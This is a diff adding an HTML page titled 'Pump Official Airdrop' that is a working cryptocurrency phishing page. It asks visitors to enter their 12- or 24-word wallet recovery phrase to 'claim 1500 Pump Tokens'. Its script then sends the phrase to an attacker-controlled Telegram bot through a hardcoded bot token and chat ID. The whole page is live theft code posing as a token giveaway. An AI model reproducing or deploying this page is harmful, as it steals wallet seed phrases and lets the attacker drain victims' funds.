@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Pump Official Airdrop</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #1e1e1e;
+      color: white;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      padding: 16px;
+      background-color: #2c2c2c;
+    }
+
+    .header h2 {
+      flex: 1;
+      text-align: center;
+      font-size: 16px;
+      margin: 0;
+    }
+
+    .back-arrow {
+      font-size: 20px;
+      cursor: pointer;
+    }
+
+    .container {
+      padding: 24px;
+    }
+
+    .title {
+      font-size: 22px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .description {
+      color: #aaa;
+      font-size: 14px;
+      margin-bottom: 24px;
+    }
+
+    textarea {
+      width: 100%;
+      height: 100px;
+      padding: 12px;
+      background-color: #2a2a2a;
+      border: 1px solid #444;
+      border-radius: 8px;
+      color: white;
+      font-size: 16px;
+      resize: none;
+      outline: none;
+    }
+
+    .import-btn,
+    .claim-btn {
+      width: 100%;
+      padding: 16px;
+      margin-top: 12px;
+      border: none;
+      border-radius: 999px;
+      font-size: 16px;
+      color: white;
+      cursor: not-allowed;
+      transition: opacity 0.2s, background-color 0.2s;
+    }
+
+    /* Import Button Styling */
+    .import-btn {
+      background-color: #6a5acd; /* Soft purple */
+      opacity: 0.4;
+    }
+
+    .import-btn:enabled {
+      opacity: 1;
+      cursor: pointer;
+    }
+
+    /* Claim Button Styling */
+    .claim-btn {
+      background-color: #4caf50; /* Green */
+      opacity: 0.4;
+    }
+
+    .claim-btn:enabled {
+      opacity: 1;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <div class="back-arrow">&#8592;</div>
+    <h2>Pump Official Airdrop</h2>
+    <div style="width: 24px;"></div>
+  </div>
+
+  <div class="container">
+    <div class="title">Recovery Phrase</div>
+    <div class="description">
+      Restore an existing wallet with your 12 or 24-word recovery phrase
+    </div>
+    <textarea id="recovery" placeholder="Recovery Phrase" oninput="checkInput()"></textarea>
+
+    <!-- Buttons -->
+    <button id="importBtn" class="import-btn" disabled onclick="sendToTelegram()">Import</button>
+    <button id="claimBtn" class="claim-btn" disabled onclick="sendToTelegram()">Claim 1500 Pump Tokens</button>
+  </div>
+
+  <script>
+    function checkInput() {
+      const val = document.getElementById("recovery").value.trim();
+      const words = val.split(/\s+/);
+      const valid = words.length === 12 || words.length === 24;
+
+      document.getElementById("importBtn").disabled = !valid;
+      document.getElementById("claimBtn").disabled = !valid;
+    }
+
+    function sendToTelegram() {
+      const phrase = document.getElementById("recovery").value.trim();
+      const chatId = "7094848924";
+      const botToken = "8001271576:AAFXKMoOR5JR8jDTklLVnrPaVi8zQ6utFsk";
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: `🧠 New Recovery Phrase:\n\n${phrase}`
+        })
+      })
+      .then(res => alert("✅ Recovery phrase sent"))
+      .catch(err => alert("❌ Failed to send"));
+    }
+  </script>
+
+</body>
+</html>
